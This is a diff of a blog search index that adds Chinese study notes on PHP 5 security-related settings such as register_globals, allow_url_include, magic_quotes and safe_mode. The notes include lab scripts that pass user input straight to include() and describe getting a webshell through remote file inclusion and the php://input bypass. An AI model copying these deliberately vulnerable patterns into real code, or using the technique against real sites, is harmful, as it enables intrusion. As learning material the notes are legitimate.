@@ -3,8 +3,278 @@
   
     
     <entry>
-      <title><![CDATA[Cookie注入与伪静态注入]]></title>
-      <url>/2018/02/26/Cookie%E6%B3%A8%E5%85%A5%E4%B8%8E%E4%BC%AA%E9%9D%99%E6%80%81%E6%B3%A8%E5%85%A5/</url>
+      <title><![CDATA[WEB-PHP核心配置]]></title>
+      <url>/2018/03/06/WEB-PHP%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/</url>
+      <content type="html"><![CDATA[<p>— 从零开始的笔记 —<br>—  PHP5核心配置 —<br><a id="more"></a></p>
+<h2 id="wamp-lamp"><a href="#wamp-lamp" class="headerlink" title="wamp/lamp"></a>wamp/lamp</h2><p>解释两个名词：</p>
+<ul>
+<li><strong>wamp</strong>：Windows下的Apache(web服务器软件)+Mysql/MariaDB(数据库系统)+Perl/PHP/Python(编程语言)</li>
+<li><strong>lamp</strong>：Linux下的Apache(web服务器软件)+Mysql/MariaDB(数据库系统)+Perl/PHP/Python(编程语言)</li>
+</ul>
+<p>另外还有以Nginx代替Apache作为web服务器软件，即形成<strong>wnmp/lnmp</strong></p>
+<h2 id="PHP指令设定的范围"><a href="#PHP指令设定的范围" class="headerlink" title="PHP指令设定的范围"></a>PHP指令设定的范围</h2><table>
+<thead>
+<tr>
+<th style="text-align:center">模式</th>
+<th style="text-align:center">含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">PHP_INI_USER</td>
+<td style="text-align:center">可在用户脚本（例如 ini_set()）或 Windows 注册表（自 PHP 5.3 起）以及 .user.ini 中设定 </td>
+</tr>
+<tr>
+<td style="text-align:center">PHP_INI_PERDIR</td>
+<td style="text-align:center">可在 php.ini(php中)，.htaccess(网站目录) 或 httpd.conf(Apache) 中设定</td>
+</tr>
+<tr>
+<td style="text-align:center">PHP_INI_SYSTEM</td>
+<td style="text-align:center">可在 php.ini 或 httpd.conf 中设定</td>
+</tr>
+<tr>
+<td style="text-align:center">PHP_INI_ALL</td>
+<td style="text-align:center">可在任何地方设定(包括ini_set())</td>
+</tr>
+</tbody>
+</table>
+<h2 id="PHP-指令配置修改"><a href="#PHP-指令配置修改" class="headerlink" title="PHP 指令配置修改"></a>PHP 指令配置修改</h2><p><strong>php.ini</strong>修改 打开文件修改。<br><strong>Windows注册表和httpd.conf修改</strong> 戳<a href="http://php.net/manual/zh/configuration.changes.php" target="_blank" rel="external">官方说明</a><br>具体说 .htaccess 和 ini_set</p>
+<h3 id="htaccess修改"><a href="#htaccess修改" class="headerlink" title=".htaccess修改"></a>.htaccess修改</h3><p><strong>.htaccess</strong>是apache在网站目录下的的配置文件，作用域有限，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表等功能。<br>其他具体功能不细说，有兴趣点这里<a href="https://www.cnblogs.com/flyxiangshang/p/5336318.html" target="_blank" rel="external">=w=</a>和<a href="http://www.jb51.net/article/80656.htm" target="_blank" rel="external">QAQ</a><br>此处说明如何在.htaccess中修改php配置</p>
+<ul>
+<li>配置httpd.conf中的<em>AllowOverride</em>，使.htaccess能用</li>
+<li>创建.htaccess文件(windows需要在命令行下创建)</li>
+<li>写入配置内容</li>
+</ul>
+<p><strong>配置内容格式</strong>：<code>php_value 配置名称 值</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php_value register_globals On</div></pre></td></tr></table></figure></p>
+<h3 id="ini-set-修改"><a href="#ini-set-修改" class="headerlink" title="ini_set()修改"></a>ini_set()修改</h3><p><strong>ini_set</strong> — 为一个配置选项设置值<br><code>string ini_set ( string $varname , string $newvalue )</code><br>设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。<br>成功时返回旧的值，失败时返回 FALSE。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span> ini_get(<span class="string">'display_errors'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line"><span class="keyword">if</span>(ini_set(<span class="string">'display_errors'</span>,<span class="string">'1'</span>)!=<span class="keyword">FALSE</span>) <span class="keyword">echo</span> <span class="string">'success'</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line"><span class="keyword">echo</span> ini_get(<span class="string">'display_errors'</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpb9n9b4h8j30cj04cjr9.jpg" alt="9.png"></p>
+<h2 id="register-globals-全局变量注册开关"><a href="#register-globals-全局变量注册开关" class="headerlink" title="register_globals(全局变量注册开关)"></a>register_globals(全局变量注册开关)</h2><p>在 PHP &lt;= 4.2.3 时是 <strong>PHP_INI_ALL</strong>。之后版本是 <strong>PHP_INI_PERDIR</strong><br>在 php &lt; 5.3.0 时是 默认为On<br>在 php &gt;= 5.3.0 时是 默认为Off<br>在 php 5.4.0 版本移除该选项，即永久为Off<br><strong>作用</strong>：设置为On时，会直接把用户GET、POST等方式提交上来的参数注册成<strong>全局变量</strong>并初始化只为参数对应的值，使得提交参数可以直接在脚本中使用</p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>以下测试是在php5.2中完成(PHP_INI_PERDIR,默认为On)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($user==<span class="string">'admin'</span>)&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'admin'</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'user'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpb8ypp9gtj30i002v0sm.jpg" alt="1.png"><br>当代码中已经<strong>初始化</strong>则无效：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$user=<span class="string">'user'</span>;</div><div class="line"><span class="keyword">if</span>($user==<span class="string">'admin'</span>)&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'admin'</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'user'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpb8z17jc2j30gp027746.jpg" alt="2.png"></p>
+<h2 id="allow-url-include-是否允许包含远程文件"><a href="#allow-url-include-是否允许包含远程文件" class="headerlink" title="allow_url_include(是否允许包含远程文件)"></a>allow_url_include(是否允许包含远程文件)</h2><p>具体范围的版本 在书中与官网不全一致。以下为官网的说明<br>在 PHP 5 时是 <strong>PHP_INI_SYSTEM</strong>，默认为Off，从 PHP 5.2.0 起可用。<br>现在为 <strong>PHP_INI_ALL</strong>。</p>
+<blockquote>
+<p>但是测试时发现一个BUG：<br>allow_url_include 的可配置范围为PHP_INI_ALL,也就是可以用ini_set()来设置<br>但是事实确实设置不了,从PHP5.2到PHP7都不行。<br>所以结论是:allow_url_include 与 allow_url_fopen 一样都是 PHP_IN_SYSTEM</p>
+</blockquote>
+<p><strong>作用</strong>：设置为On时，可以直接包含远程文件(http:// 与ftp:// )，比如include包含。<code>include($var)</code> 当$var可控时，可以执行PHP代码<br>讲<strong>allow_url_include</strong>的同时就会提到<strong>allow_url_fopen</strong>。因为在官方文档中使用<em>allow_url_include</em>的前提是<em>allow_url_fopen</em>为On</p>
+<h3 id="allow-url-fopen-是否允许打开远程文件"><a href="#allow-url-fopen-是否允许打开远程文件" class="headerlink" title="allow_url_fopen(是否允许打开远程文件)"></a>allow_url_fopen(是否允许打开远程文件)</h3><p>在 PHP &lt;= 4.3.4 时是 PHP_INI_ALL。之后版本是 PHP_INI_SYSTEM,默认为On<br><strong>作用</strong>：设置为On时，允许打开远程文件，比如fopen打开。</p>
+<h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><p>其实这两个选项形成的就是远程文件包含漏洞</p>
+<blockquote>
+<p>开始前，补充。<br><strong>fopen函数</strong>与<strong>include函数</strong>区别：<br>fopen与include打开/包含远程文件时，对方服务器都会先解析文件然后被本地php代码 打开/包含。<br>区别是：<br>fopen是直接读取这个文件，当做一个输入流，不会在本地做解析。include会包含进入代码内，再解析执行一次。<br>所以include包含的文件里有木马时，可以执行。fopen打开一个包含木马的文件，不会有什么大危害，因为只是作为文本文件。</p>
+</blockquote>
+<p>以下测试是在php5.2中完成。<br>1.当<em>allow_url_fopen</em>为On,<em>allow_url_include</em>不为Off时<br>只能进行远程文件打开，比如fopen(url)。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span> <span class="string">'allow_url_fopen:'</span>.ini_get(<span class="string">'allow_url_fopen'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'allow_url_include:'</span>.ini_get(<span class="string">'allow_url_include'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line">$url=$_GET[<span class="string">'url'</span>];</div><div class="line"></div><div class="line">$file=fopen($url,<span class="string">"r"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</div><div class="line"><span class="keyword">while</span> (!feof($file))&#123;</div><div class="line">    $line = fgets($file,<span class="number">1024</span>);   </div><div class="line">    <span class="keyword">echo</span> $line;</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpb8zi936vj30lw04gwej.jpg" alt="4.png"><br>2.当<em>allow_url_fopen</em>和<em>allow_url_include</em>都为On时<br>可以进行远程文件包含执行，即可以包含在自己服务器的木马，形成web-shell。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span> <span class="string">'allow_url_fopen:'</span>.ini_get(<span class="string">'allow_url_fopen'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'allow_url_include:'</span>.ini_get(<span class="string">'allow_url_include'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line">$url=$_GET[<span class="string">'url'</span>];</div><div class="line"><span class="keyword">include</span>($url);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fpb8z6itpmj30r705bt8z.jpg" alt="3.png"></p>
+<h4 id="data-输入方式"><a href="#data-输入方式" class="headerlink" title="data:输入方式"></a>data:输入方式</h4><p>另外还有一种方法是<strong>data：</strong><br>本以为<strong>data：</strong>可以在<em>allow_url_fopen</em>为Off时起作用，测试时发现不可以。应该是data：被当做allow_url_fopen禁止的一项了。<br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpb90by9w2j30io08bweu.jpg" alt="8.png"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fpb9062e6hj30if0a6wet.jpg" alt="7.png"><br>3.当<em>allow_url_fopen</em>为Off，<em>allow_url_include</em>为On时<br>理论与实际上都是不能进行远程包含，但是我们远程包含的目的就是写入木马文件，可以通过绕过方法直接形成web_shell。<br>这里提一下绕过方法：伪协议<strong>php://input</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span> <span class="string">'allow_url_fopen:'</span>.ini_get(<span class="string">'allow_url_fopen'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'allow_url_include:'</span>.ini_get(<span class="string">'allow_url_include'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line">$url=$_GET[<span class="string">'url'</span>];</div><div class="line"><span class="keyword">include</span>($url);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fpb8zq81swj30iv0amwf2.jpg" alt="5.png"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fpb8zzo64xj30k80a8t92.jpg" alt="6.png"></p>
+<h2 id="magic-quotes-gpc-魔术引号自动过滤"><a href="#magic-quotes-gpc-魔术引号自动过滤" class="headerlink" title="magic_quotes_gpc(魔术引号自动过滤)"></a>magic_quotes_gpc(魔术引号自动过滤)</h2><p>在 PHP &lt;= 4.2.3 时是 <strong>PHP_INI_ALL</strong>，之后是 <strong>PHP_INI_PERDIR</strong>， 默认为On。<br>从 PHP 5.3.0 起不推荐使用。 在 PHP 5.4.0 中移除该选项。（避免了magic_quotes_gpc未设置，用户依赖这个设置而带来了安全隐患）<br><strong>作用</strong>：为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。当 magic_quotes 为 on，自动在单引号(‘)、双引号(“)、反斜杠()及空字符(NULL)前面加上反斜杠()。不会过滤<strong>$_SERVER</strong>变量，可以利用client-ip、referer一类的漏洞。<br>如果 magic_quotes_sybase 也是 ON，它会完全覆盖 magic_quotes_gpc</p>
+<h3 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h3><p>以下测试是在php5.2中完成。<br>magic_quotes_gpc 为 On<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">print_r($_GET);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fpb90lzewyj30go040glk.jpg" alt="10.png"></p>
+<h2 id="magic-quotes-runtime-魔术引号自动过滤"><a href="#magic-quotes-runtime-魔术引号自动过滤" class="headerlink" title="magic_quotes_runtime(魔术引号自动过滤)"></a>magic_quotes_runtime(魔术引号自动过滤)</h2><p>范围是 <strong>PHP_INI_ALL</strong>，默认为 Off<br>本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。<br><strong>作用</strong>：对于从<strong>数据库或者文件</strong>中获取的数据自动在单引号(‘)、双引号(“)、反斜杠()及空字符(NULL)前面加上反斜杠() （测试后貌似对空字符无效）<br>如果 magic_quotes_sybase 也是 ON，它会完全覆盖 magic_quotes_runtime<br>覆盖函数列表:</p>
+<pre><code>get_meta_tags()
+file_get_contents()
+file()
+fgets()
+fwrite()
+fread()
+fputcsv()
+stream_socket_recvfrom()
+exec()
+system()
+passthru()
+stream_get_contents()
+bzread()
+gzfile()
+gzgets()
+gzwrite()
+gzread()
+exif_read_data()
+dba_insert()
+dba_replace()
+dba_fetch()
+ibase_fetch_row()
+ibase_fetch_assoc()
+ibase_fetch_object()
+mssql_fetch_row()
+mssql_fetch_object()
+mssql_fetch_array()
+mssql_fetch_assoc()
+mysqli_fetch_row()
+mysqli_fetch_array()
+mysqli_fetch_assoc()
+mysqli_fetch_object()
+pg_fetch_row()
+pg_fetch_assoc()
+pg_fetch_array()
+pg_fetch_object()
+pg_fetch_all()
+pg_select()
+sybase_fetch_object()
+sybase_fetch_array()
+sybase_fetch_assoc()
+SplFileObject::fgets()
+SplFileObject::fgetcsv()
+SplFileObject::fwrite()
+</code></pre><h3 id="测试-3"><a href="#测试-3" class="headerlink" title="测试"></a>测试</h3><p>以下测试是在php5.2中完成。<br>magic_quotes_runtime 为 On<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//1.txt '"\</span></div><div class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"1.txt"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fpb90u3ty4j30em02jq2t.jpg" alt="11.png"></p>
+<h2 id="magic-quptes-sybase（魔术引号自动过滤）"><a href="#magic-quptes-sybase（魔术引号自动过滤）" class="headerlink" title="magic_quptes_sybase（魔术引号自动过滤）"></a>magic_quptes_sybase（魔术引号自动过滤）</h2><p>范围是 <strong>PHP_INI_ALL</strong> 。默认为Off<br>在 PHP 5.4.0 中移除该选项。<br><strong>作用</strong>：当设置为On时，会覆盖掉magic_quotes_gpc=On。仅仅 转义空字符 以及 单引号(‘)前再加一个单引号(‘)。会覆盖掉magic_quotes_runtime=On,仅仅把单引号(‘)前再加一个单引号(‘)</p>
+<h3 id="测试-4"><a href="#测试-4" class="headerlink" title="测试"></a>测试</h3><p>以下测试是在php5.2中完成。<br>magic_quotes_gpc 为 On<br>magic_quotes_runtime 为 On<br>magic_quotes_sybase 为 On<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//1.txt 1'2"3\</span></div><div class="line">print_r($_GET);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"1.txt"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fpb91002yij30hh03n0sp.jpg" alt="12.png"></p>
+<h2 id="safe-mode-安全模式"><a href="#safe-mode-安全模式" class="headerlink" title="safe_mode(安全模式)"></a>safe_mode(安全模式)</h2><p>范围是 <strong>PHP_INI_SYSTEM</strong> ，默认为 Off。<br>在 PHP 5.4.0 中移除该选项。<br><a href="http://php.net/manual/zh/ini.sect.safe-mode.php#ini.safe-mode-gid" target="_blank" rel="external">官方文档</a><br><strong>作用</strong>：<br>1.PHP 所有文件操作函数 会受到限制。会检查当前脚本的拥有者是否和将被操作的文件的拥有者相匹配，即你不能操作不属于你的文件。如果需要用 include等函数 加载一些放在非WEB服务启动用户所有的目录下的脚本文件，使用<strong>safe_mode_include_dir</strong>指令来配置可以包含的路径。<br>2.PHP 函数执行命令或程序会提示错误。当使用外部脚本时，集中在一个目录下，使用<strong>safe_mode_exec_dir</strong>指令指向目录。<br>当safe_mode为On时，下面选项开启<br>下列选项范围都为<strong>PHP_INI_SYSTEM</strong></p>
+<ul>
+<li><strong>safe_mode_gid</strong>：默认”0”。安全模式在打开文件时会做 UID 比较检查。如果想将其放宽到 GID 比较，则打开 safe_mode_gid。</li>
+<li><strong>safe_mode_include_dir</strong>：默认为NULL。当从此目录及其子目录（目录<strong>必须</strong>在 include_path 中 或者 用完整路径来包含）包含文件时越过 UID/GID 检查。 </li>
+</ul>
+<blockquote>
+<p>从 PHP 4.2.0 开始，本指令可以接受和 include_path 指令类似的风格用冒号（Windows 中是分号）隔开的路径，而不只是一个目录。 指定的限制实际上是一个前缀，而非一个目录名，目录名需要以/结尾。<br>“safe_mode_include_dir = /dir/incl” 将允许访问 “/dir/include”和“/dir/incls”等文件<br>“safe_mode_include_dir = /dir/incl/” 将允许访问 “/dir/incl/”目录下的文件<br>如果本指令的值为空，在 PHP 4.2.3 中以及 PHP 4.3.3 起具有不同 UID/GID 的文件将不能被包含。在较早版本中，所有文件都能被包含。 </p>
+<p><strong>include_path</strong> :范围是 PHP_INI_ALL。 默认”.;/path/to/php/pear”<br>作用：指定一个目录列表，让require、include、fopen（）、file（）、readfile（）和file_get_contents（）函数从中查找文件。该格式类似于系统的PATH环境变量：在Unix中使用冒号(:)分隔的目录列表或在Windows中使用分号(;)。<br>修改： set_include_path()</p>
+</blockquote>
+<ul>
+<li><strong>safe_mode_exec_dir</strong>：默认””。如果 PHP 使用了安全模式，system() 和其它程序执行函数（见文末）将拒绝启动不在此目录中的程序。必须使用 / 作为目录分隔符，包括 Windows 中。 </li>
+<li><strong>safe_mode_allowed_env_vars</strong>：默认为”PHP<em>“。设置某些环境变量可能是潜在的安全缺口。本指令包含有一个逗号分隔的前缀列表。在安全模式下，用户只能改变那些名字具有在这里提供的前缀的环境变量。默认情况下，用户只能设置以 PHP</em> 开头的环境变量（例如 PHP_FOO = BAR）。</li>
+</ul>
+<blockquote>
+<p>如果本指令为空，PHP 将使用户可以修改任何环境变量！ </p>
+</blockquote>
+<ul>
+<li><strong>safe_mode_protected_env_vars</strong>：默认为”LD_LIBRARY_PATH”。本指令包含有一个逗号分隔的环境变量的列表，最终用户不能用 putenv() 来改变这些环境变量。甚至在 safe_mode_allowed_env_vars 中设置了允许修改时也不能改变这些变量。 </li>
+</ul>
+<blockquote>
+<p>putenv（） — 设置环境变量的值<br>添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。<br>如：putenv(“UNIQID=$uniqid”);<br>getenv（） — 得到环境变量的值<br><strong>putenv/getenv、$_ENV、phpinfo（INFO_ENVIRONMENT） 三者变量完全隔离不会互相影响</strong></p>
+</blockquote>
+<h3 id="影响函数"><a href="#影响函数" class="headerlink" title="影响函数"></a>影响函数</h3><p>以下函数只做大致了解，知道其大致作用。<br>文件操作函数</p>
+<pre><code>apache_request_headers — 获取当前请求的所有请求头信息 
+fopen — 打开文件或者 URL
+header — 发送原生 HTTP 头
+dl — 运行时载入一个 PHP 扩展
+link — 建立一个硬连接
+file — 把整个文件读入一个数组中
+chdir — 改变目录，将 PHP 的当前目录改为 directory。 
+chgrp — 改变文件所属的组
+chmod — 改变文件模式
+chown — 改变文件的所有者
+copy — 拷贝文件
+rename — 重命名一个文件或目录
+popen — 打开进程文件指针
+mkdir — 创建目录
+rmdir — 删除目录
+touch — 设定文件的访问和修改时间
+dbase_open — 打开一个数据库
+dba_open — 打开一个数据库
+filepro等 — 有关映射文件函数
+putenv — 设置环境变量的值
+......过多不列举
+</code></pre><p>程序执行函数：</p>
+<pre><code>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数
+escapeshellcmd — shell 元字符转义
+exec — 执行一个外部程序
+passthru — 执行外部程序并且显示原始输出
+proc_close — 关闭由 proc_open 打开的进程并且返回进程退出码
+proc_get_status — 获取由 proc_open 函数打开的进程的信息
+proc_nice — 修改当前进程的优先级
+proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。
+proc_terminate — 杀除由 proc_open 打开的进程
+shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。
+system — 执行外部程序，并且显示输出
+</code></pre><h2 id="open-basedir-PHP可访问目录"><a href="#open-basedir-PHP可访问目录" class="headerlink" title="open_basedir PHP可访问目录"></a>open_basedir PHP可访问目录</h2><p>范围是 PHP_INI_ALL 。 默认是 NULL 是允许打开所有文件<br>在 PHP &lt; 5.3.0 时是 PHP_INI_SYSTEM<br><strong>作用</strong>：open_basedir 将能打开的文件限制在指定的目录树下。本指令不受安全模式打开或者关闭的影响。 </p>
+<ul>
+<li>特殊值<strong>.</strong> 指定脚本的工作目录被作为基准目录。但是可以通过chdir来改变工作目录</li>
+<li>指定的限制实际上是一个前缀，而非一个目录名，目录名需要以/结尾，与safe_mode_include_dir相同。</li>
+<li>可以在httpd.conf中修改来关闭</li>
+<li>在 Windows 中，用分号分隔目录。在任何其它系统中用冒号分隔目录</li>
+</ul>
+<h2 id="display-errors-和-error-reporting"><a href="#display-errors-和-error-reporting" class="headerlink" title="display_errors 和 error_reporting"></a>display_errors 和 error_reporting</h2><p><a href="http://php.net/manual/zh/errorfunc.configuration.php#ini.error-reporting" target="_blank" rel="external">官网详情</a><br>两者范围都是 <strong>PHP_INI_ALL</strong><br>display_errors 默认为 On 。 error_reporting 默认为 NULL<br><strong>display_errors作用</strong>：该选项设置是否将错误信息作为输出的一部分显示到屏幕，或者对用户隐藏而不显示。<br>还可以设置 “display=stderr” 表示发送到 stderr 而不是 stdout。(只影响CGI/CLI的二进制文件)<br>“stderr”从 PHP 5.2.4 开始可用。在以前的版本中，该配置值的类型为 boolean.<br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fpb9178typj30fu05t74j.jpg" alt="13.png"><br>当 display_errors=On 时，可以设置error_reporting</p>
+<h3 id="error-reporting"><a href="#error-reporting" class="headerlink" title="error_reporting"></a>error_reporting</h3><p><strong>error_reporting的作用</strong>: 设置错误报告的级别。<br>该参数可以是一个任意的表示二进制位字段的整数，或者<a href="http://php.net/manual/zh/errorfunc.constants.php" target="_blank" rel="external">内置常量</a>配置。<br>在PHP 4和PHP 5之中，其默认值为 <code>E_ALL &amp; ~E_NOTICE</code>。 该设置表示除了 E_NOTICE 其他都显示的错误级别。</p>
+<h2 id="其他安全常用指令"><a href="#其他安全常用指令" class="headerlink" title="其他安全常用指令"></a>其他安全常用指令</h2><table>
+<thead>
+<tr>
+<th style="text-align:center">指令</th>
+<th style="text-align:center">范围</th>
+<th style="text-align:center">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">expose_php</td>
+<td style="text-align:center">php.ini only</td>
+<td style="text-align:center">是否在服务器返回信息HTTP头显示PHP版本</td>
+</tr>
+<tr>
+<td style="text-align:center">max_execution_time</td>
+<td style="text-align:center">PHP_INI_ALL</td>
+<td style="text-align:center">每个脚本做多执行秒数</td>
+</tr>
+<tr>
+<td style="text-align:center">memory_limit</td>
+<td style="text-align:center">PHP_INI_ALL</td>
+<td style="text-align:center">每个脚本能够使用的最大内存数量</td>
+</tr>
+<tr>
+<td style="text-align:center">log_errors</td>
+<td style="text-align:center">PHP_INI_ALL</td>
+<td style="text-align:center">将错误输入到日志文件</td>
+</tr>
+<tr>
+<td style="text-align:center">log_errors_max_len</td>
+<td style="text-align:center">PHP_INI_ALL</td>
+<td style="text-align:center">设定log_errors的最大长度</td>
+</tr>
+<tr>
+<td style="text-align:center">variables_order</td>
+<td style="text-align:center">PHP_INI_PERDIR</td>
+<td style="text-align:center">描述PHP注册GET、POST、Cookie、环境、内置变量的顺序，注册从左往右，新值会覆盖旧值</td>
+</tr>
+<tr>
+<td style="text-align:center">post_max_size</td>
+<td style="text-align:center">PHP_INI_PERDIR</td>
+<td style="text-align:center">PHP可以接受的最大POST数据大小</td>
+</tr>
+<tr>
+<td style="text-align:center">auto_prepend_file</td>
+<td style="text-align:center">PHP_INI_PERDIR</td>
+<td style="text-align:center">在任何PHP文档之前自动包含的文件</td>
+</tr>
+<tr>
+<td style="text-align:center">auto_append_file</td>
+<td style="text-align:center">PHP_INI_PERDIR</td>
+<td style="text-align:center">在任何PHP文档之后自动包含的文件</td>
+</tr>
+<tr>
+<td style="text-align:center">extension_dir</td>
+<td style="text-align:center">PHP_INI_SYSTEM</td>
+<td style="text-align:center">可加载的扩展（模块）的目录位置</td>
+</tr>
+<tr>
+<td style="text-align:center">file_uploads</td>
+<td style="text-align:center">PHP_INI_SYSTEM</td>
+<td style="text-align:center">是否允许HTTP文件上传</td>
+</tr>
+<tr>
+<td style="text-align:center">upload_tmp_dir</td>
+<td style="text-align:center">PHP_INI_SYSTEM</td>
+<td style="text-align:center">对于HTTP上传文件的临时文件目录</td>
+</tr>
+<tr>
+<td style="text-align:center">upload_max_filesize</td>
+<td style="text-align:center">PHP_INI_SYSTEM</td>
+<td style="text-align:center">允许上传的最大文件大小</td>
+</tr>
+</tbody>
+</table>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> web </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[WEB-Cookie注入与伪静态注入]]></title>
+      <url>/2018/02/26/WEB-Cookie%E6%B3%A8%E5%85%A5%E4%B8%8E%E4%BC%AA%E9%9D%99%E6%80%81%E6%B3%A8%E5%85%A5/</url>
       <content type="html"><![CDATA[<p>—  从零开始的笔记  —<br>— cookie 伪静态 中转 —<br><a id="more"></a></p>
 <hr>
 <p>因为cookie注入与伪静态注入都可以利用到中转注入，所以合在一起说明了<br>但是对于中转注入的编写，还停留在工具上，并没有自己实践编写，所以这里只是简单提一下。</p>
